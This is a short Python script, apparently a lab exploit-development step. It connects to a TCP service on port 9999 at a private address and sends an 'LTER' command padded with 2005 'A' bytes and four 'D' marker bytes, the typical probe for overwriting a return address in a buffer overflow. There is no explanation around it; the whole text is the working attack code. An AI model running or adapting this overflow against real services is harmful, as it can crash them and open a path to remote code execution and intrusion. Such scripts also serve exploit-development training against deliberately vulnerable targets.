import socket, sys
from time import sleep
payload=b""
payload+=b"A"*2005
payload+=b"D"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"LTER ./"+payload))
s.close()
sys.exit()
